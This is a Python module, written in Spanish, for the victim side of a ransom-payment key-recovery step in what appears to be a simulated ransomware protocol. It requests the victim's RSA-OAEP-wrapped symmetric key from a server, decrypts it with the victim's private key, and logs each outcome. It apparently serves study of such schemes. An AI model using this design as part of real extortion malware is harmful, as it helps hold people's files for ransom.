"""Recuperación por pago: solicitud y entrega de sV bajo pkV."""

from pathlib import Path

from Crypto.PublicKey import RSA

from protocolo.mensajes import (
    TIPO_ERROR,
    TIPO_PAGO,
    TIPO_SOLICITUD,
    conectar,
    emitir,
    leer,
)
from protocolo.oaep import abrir

IDENTIDAD = Path("/datos/identidad")
RECUPERADOS = Path("/datos/recuperados")
CIFRADOS = Path("/datos/cifrados")
TRAZA = Path("/datos/traza-victima/pago")


class PagoRechazado(Exception):
    def __init__(self, motivo):
        self.motivo = motivo
        super().__init__(motivo)


def _trazar(id_v, resultado, detalle):
    TRAZA.parent.mkdir(parents=True, exist_ok=True)
    with TRAZA.open("a", encoding="utf-8") as salida:
        salida.write(f"pago {id_v.hex()} {resultado} {detalle}\n")


def solicitar(id_v, destino):
    """Envía la solicitud (tipo 5) y devuelve (id_v, cifrado_oaep)."""
    with conectar(destino) as conexion:
        conexion.sendall(emitir(TIPO_SOLICITUD, id_v))
        tipo, cuerpo = leer(conexion)
    if tipo == TIPO_ERROR and cuerpo[:16] == id_v:
        motivo = cuerpo[16:].decode("utf-8")
        _trazar(id_v, "error", motivo)
        raise PagoRechazado(motivo)
    if tipo != TIPO_PAGO or len(cuerpo) < 16 or cuerpo[:16] != id_v:
        _trazar(id_v, "error", "respuesta")
        raise PagoRechazado("respuesta")
    _trazar(id_v, "ok", "solicitud")
    return id_v, cuerpo[16:]


def recuperar(id_v, destino):
    """Flujo completo: solicitar sV, descifrarla con skV, devolverla."""
    id_v, cifrado = solicitar(id_v, destino)
    sk_v = RSA.import_key((IDENTIDAD / "skV.der").read_bytes())
    try:
        sv = abrir(sk_v).decrypt(cifrado)
    except ValueError as error:
        _trazar(id_v, "error", "no-abre")
        raise PagoRechazado("no-abre") from error
    if len(sv) != 32:
        _trazar(id_v, "error", "largo")
        raise PagoRechazado("largo")
    _trazar(id_v, "ok", "sv")
    return sv